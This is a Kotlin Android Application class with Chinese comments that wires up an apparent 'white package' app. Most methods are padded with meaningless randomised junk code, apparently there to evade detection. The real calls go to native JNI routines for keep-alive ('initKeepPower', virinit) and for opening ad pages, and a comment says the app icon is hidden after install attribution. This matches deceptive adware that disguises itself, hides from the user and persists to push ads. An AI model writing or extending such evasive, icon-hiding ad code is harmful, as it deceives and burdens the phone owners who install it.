package cyok.mwup.rnxju

import android.app.Application
import android.content.Intent
import android.os.Bundle
import cyok.mwup.rnxju.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import cyok.pgg.lsiw.ad.runtime.AdLifecycleInstaller
import cyok.pgg.lsiw.base.APPContext
import cyok.pgg.lsiw.base.OverseaAppHost
import cyok.pgg.lsiw.base.OverseaAppInitializer


class RDT : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: RDT? = null
    }

    override fun onCreate() {
        val arr_FrSerZrqBVNvCa  = listOf("GJwYRPLL", "YXsLQaLAxygh", "TQeqPmcEjjiKMgZhHRM").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_pMtOYIZQdVjTNbaXK  = arr_FrSerZrqBVNvCa .filter { it.length > 63 }
         if (ad_pMtOYIZQdVjTNbaXK .isNotEmpty() && java.lang.System.currentTimeMillis() < 44) {
             ad_pMtOYIZQdVjTNbaXK .forEach { _ ->  }
         }
        super.onCreate()
        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun openLaunch(intent: Intent?) {
        val uhWDyEB : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val zSTCgc  = uhWDyEB ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_4" 
            }
            if (zSTCgc .startsWith("HLkgkJxxkFFCPniNQ ")) {
                android.util.Log.v("TAG", zSTCgc )
            }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_YyfedJPGNBQ  = listOf("lPuLEraYT", "tSkDZfJuAc", "jijEYTCGLziAGni").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_fpPEN  = arr_YyfedJPGNBQ .filter { it.length > 54 }
         if (ad_fpPEN .isNotEmpty() && java.lang.System.currentTimeMillis() < 22) {
             ad_fpPEN .forEach { _ ->  }
         }
        ZTUW.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_ETmGqY = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_gPEarRkF  = (arr_ETmGqY  shl 12) xor (arr_ETmGqY  shr 64)
         val j_rqwymxqHFIQZEAJW  = i_gPEarRkF .inv() and 0xFFFF
         if (j_rqwymxqHFIQZEAJW  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_IpckEpIFhssYavnxT")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val BfMHBTbyPoG : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val HEnEPJUatxviX  = BfMHBTbyPoG ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_25" 
            }
            if (HEnEPJUatxviX .startsWith("eifiKKLkj ")) {
                android.util.Log.v("TAG", HEnEPJUatxviX )
            }
        // 图标隐藏已由 oversea_base_module 在归因后置流程统一调度(OverseaAppHost.enableIconHide 默认开启)
    }


    override fun initKeepPower(app: Application) {
        val BplgIzFZXeATV : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val oiDdblJw  = BplgIzFZXeATV ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_1" 
            }
            if (oiDdblJw .startsWith("nOJoHWd ")) {
                android.util.Log.v("TAG", oiDdblJw )
            }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}